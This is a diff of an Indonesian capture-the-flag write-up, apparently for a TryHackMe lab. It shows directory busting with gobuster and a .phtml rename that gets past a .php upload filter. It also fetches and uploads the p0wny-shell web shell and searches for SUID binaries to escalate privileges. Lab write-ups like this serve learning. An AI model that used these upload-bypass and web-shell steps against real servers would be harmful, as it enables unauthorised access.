@@ -18,16 +18,27 @@ Langkah awal dilakukan dengan memindai target menggunakan `nmap` untuk melihat p
 
 ## 2. Enumerasi Web (Directory Busting)
 Menggunakan `gobuster` untuk menemukan direktori tersembunyi pada server web.
+
 ```bash
 gobuster dir -u http://10.49.174.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
-***Hasil Utama:***
+Hasil Utama:
 /panel/ : Halaman untuk mengunggah file.
 /uploads/ : Folder tempat file yang diunggah disimpan.
 
-Mendapatkan Akses Awal (Gaining Shell)
+## 3. Mendapatkan Akses Awal (Gaining Shell)
 Server memiliki filter keamanan yang memblokir ekstensi .php. Untuk melewatinya, saya menggunakan ekstensi .phtml.
 Menyiapkan Web Shell (p0wny-shell).
+
+```wget https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php```
+
+Ganti Ekstensi
+Agar server target menerima file ini, ganti ekstensinya menjadi .phtml:
+
+```bash
+mv shell.php shell.phtml
+```
 Mengunggah shell.phtml melalui halaman http://10.49.174.191.
 Mengakses shell di http://10.49.174.191.
 User Flag:
@@ -38,11 +49,15 @@ cat /var/www/user.txt
 # Output: THM{y0u_g0t_a_sh3ll}
 ```
 
-Eskalasi Hak Akses (Privilege Escalation)
+## 4. Eskalasi Hak Akses (Privilege Escalation)
 Mencari file dengan izin SUID untuk menemukan celah eskalasi.
 
 ```bash
 find / -user root -perm /4000 2>/dev/null
+```
+
+```bash
+cat /var/www/user.txt
 ```
 
 Ditemukan file yang tidak lazim: /usr/bin/python2.7.
